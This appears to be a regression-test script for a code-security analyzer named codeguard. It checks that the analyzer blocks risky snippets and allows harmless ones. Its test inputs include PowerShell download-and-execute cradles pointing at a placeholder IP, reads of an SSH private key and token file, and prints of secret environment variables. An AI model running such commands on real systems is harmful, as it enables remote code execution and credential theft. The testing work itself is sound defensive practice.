"""Regression checks for bugs found during manual testing. Run: python eval/regressions.py

Each case pins one behaviour that was wrong once, so it cannot silently come back.
"""
import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), ".."))
from codeguard import analyze  # noqa: E402
from codeguard.router import detect_language  # noqa: E402

# A YAML test suite whose `code:` values hold Python and whose `expected:` lists are labels.
YAML_SUITE = """test_suite: python_security_stress_test
version: "1.0"
tests:
  - id: SEC001
    category: code_injection
    code: |
      expression = input("Expression: ")
      result = eval(expression)
    expected:
      - unsafe_eval
  - id: SEC029
    category: information_disclosure
    code: |
      from flask import request
      def debug_info():
          return {"environment": dict(os.environ)}
    expected:
      - sensitive_information_disclosure
      - environment_secret_exposure
"""


def check(name, cond, detail=""):
    print(f"{'PASS' if cond else 'FAIL'}  {name}" + (f"  ({detail})" if detail and not cond else ""))
    return cond


def main():
    ok = True
    r = analyze(YAML_SUITE)
    label_line = YAML_SUITE.splitlines().index("      - environment_secret_exposure") + 1
    code_line = next(i for i, l in enumerate(YAML_SUITE.splitlines(), 1) if "dict(os.environ)" in l)

    # 1. A YAML label containing "environment" + "secret" is not an env-var read.
    ok &= check("label 'environment_secret_exposure' is not flagged", label_line not in r["vulnerable_lines"], r["vulnerable_lines"])
    # 2. The real leak in the embedded code is still caught, on the right line.
    ok &= check("dict(os.environ) still blocks as secret_access",
                r["verdict"] == "block" and r["categories"] == ["secret_access"] and r["vulnerable_lines"] == [code_line], r)
    # 3. A YAML document full of embedded Python reports code_language "yaml".
    ok &= check("YAML with embedded Python is detected as yaml", r["code_language"] == "yaml", r["code_language"])
    # 4. The reason lists threats only (no weak capability notes when rules decided).
    ok &= check("reason has no capability-only notes", "reads environment variables" not in r["reason"], r["reason"])
    # 5. Real env-var reads are still detected after tightening the rule.
    for code in ['print(os.environ["AWS_SECRET_ACCESS_KEY"])', "console.log(process.env.STRIPE_SECRET_KEY)"]:
        ok &= check(f"still blocks: {code}", analyze(code)["verdict"] == "block", analyze(code)["reason"])
    # 6. Python `from x import y` is not mistaken for a Dockerfile FROM line.
    ok &= check("python 'from flask import' stays python",
                detect_language("from flask import Flask\napp = Flask(__name__)\n") == "python")
    # 7. A leading BOM (Windows editors) is an encoding marker, not hidden text; one later in the code still blocks.
    bom = analyze("﻿import os\nprint(os.getcwd())")
    ok &= check("leading BOM allowed, language still python", bom["verdict"] == "allow" and bom["code_language"] == "python", bom)
    ok &= check("BOM inside code still blocks", analyze("x = 1﻿\nprint(x)")["verdict"] == "block")
    # 8. PowerShell download cradles (download, then Invoke-Expression) block; a plain download does not.
    for code in ["iwr http://203.0.113.5/a.ps1 | iex", "Invoke-Expression (Invoke-WebRequest http://203.0.113.5/a.ps1).Content"]:
        ok &= check(f"blocks: {code}", "dependency_risk" in analyze(code)["categories"], analyze(code))
    ok &= check("plain Invoke-WebRequest -OutFile is allowed",
                analyze("Invoke-WebRequest https://example.test/file.zip -OutFile file.zip")["verdict"] == "allow")
    # 9. Team-case findings: Path.joinpath key paths and secret-named files block; harmless env use does not.
    for code in ['from pathlib import Path\nprint(Path.home().joinpath(".ssh", "id_rsa").read_text())',
                 'import os\nkey = open(os.path.expanduser("~/.config/app/token.txt")).read()\nprint(key)',
                 'import os\nprint(os.environ.get("APP_MODE"), os.environ["DB_PASSWORD"])']:
        ok &= check(f"blocks: {code.splitlines()[-1][:60]}", analyze(code)["verdict"] == "block", analyze(code)["reason"])
    for code in ['import os\nmode = os.environ.get("APP_MODE", "development")\nprint(mode)',
                 'import os\nconfigured = bool(os.environ.get("SERVICE_TOKEN"))\nprint("token configured:", configured)',
                 'import os\nnames = sorted(os.environ.keys())\nprint(names)',
                 'import json\ncfg = json.load(open("tokenizer.json"))']:
        ok &= check(f"allows: {code.splitlines()[-1][:60]}", analyze(code)["verdict"] == "allow", analyze(code)["reason"])
    print("\nALL PASS" if ok else "\nSOME FAILED")
    sys.exit(0 if ok else 1)


if __name__ == "__main__":
    main()
